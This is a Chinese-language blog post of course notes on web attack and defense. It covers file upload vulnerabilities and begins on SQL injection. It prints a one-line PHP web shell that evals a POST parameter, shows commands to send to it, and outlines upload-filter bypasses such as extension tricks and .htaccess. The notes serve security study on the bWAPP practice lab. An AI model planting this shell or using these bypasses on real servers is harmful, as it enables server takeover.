---
title: Web网络安全 - 极客时间
date: "2021-3-1"
description: "极客时间的 `web网络安全攻防实战` 课程记录"
toc: true
tags: 
category: techology
---

极客时间的 **web网络安全攻防实战** 课程记录

web 安全的根本性原因是 `前端输入不可信`

# 常用的工具
- **Burp-Suite**: Burp Suite Professional is one of the most popular penetration testing and vulnerability finder tools
- **cURL**: 系统自带
- **Postman**: GUI式cURL
- **Wappalyzer**: 网站技术栈分析
- **HackBar**: web安全工具插件


# Web 后端安全

## 文件上传漏洞
举个例子，后端服务器若为 `PHP`，那么可以上传一个 `shell.php` 文件，里面包含

```php
# shell.php

# 通过php，调用 post 请求中的 hacker 参数
<?php @eval($_POST['hacker']); ?>  
```

一旦文件上传成功，即可把下面的命令加入 `post` 请求体
```bash
# 任意 Post 请求的请求体

hacker=echo getcwd()
hacker=echo get_current_user()
```

工具： 
- 可以用 `中国菜刀`，一个 win 平台的工具
- 使用 `Docker` 运行 bWAPP 平台练习

### 初阶：后缀名绕过
```bash
# 修改 shellp.php 的名字
cp  shell.php  shell.php3    # True

cp  shell.php  shell.php30   # False
```

```bash
# 如何探究其原因

-> netstate 命令 (获取 Program name，例 Apache2)
-> 找到 Apache 配置文件 `Apache.config`
-> 找到 module 加载配置
-> 找到 php5.conf 配置文件
-> 发现 <FilesMatch ".+\.ph(p[345]?|t|tml)$"> 正则匹配
```


### 中阶：3种
1. 前端验证绕过
   
    很多 CMS(content management system) 都只在前端用 js 来做校验

    漏洞利用流程  

    1. 通过 Burp Suite 抓包，修改内容后放行 `常见`
    2. 通过 Chrome 禁止or删除 js 代码 

2. `.htaccess` 绕过

    - 前提：web server 支持 `.htaccess` 分布式配置文件
    - 原理：使用此文件绕过 `黑名单过滤`
    - 例子：比如黑名单限制上传 `php` 文件，但是上传 `jpg` 文件，利用 `.htaccess` 告诉目前文件夹可以去解析某一类文件。
    - 用 `php` 解析 `jpg`

```  
白名单过滤：不能使用，因为 .htaccess 无法上传
黑名单过滤：只要没有限制 .htaccess 就可以上传，伪装为 .test （例）
```

3. 大小写绕过

   - Windows: 大小写`不敏感`
   - Linux: 大小写`敏感`

<img src="web-security-1.png" width="40%" />

### 高阶：3种
- `文件流绕过`，针对 windows 文件流
- `字符串截断`，当拼接目录时
- `文件头检测`，(绕过白名单，需要检测文件内容时，注意不要有乱码)



## SQL 注入漏洞

是发生于 `应用程序与数据库` 的安全漏洞  

实际情况中，需要结合用户的输入`动态构造SQL语句`，导致此时有SQL注入风险

提交网页时，主要分 GET方法，POST方法

### Web 应用三层架构
界面层 + 业务逻辑层 + 数据访问层

<img src="web-security-2.png" width="70%" />


```
具体案例
```

<img src="web-security-3.png" width="70%" />
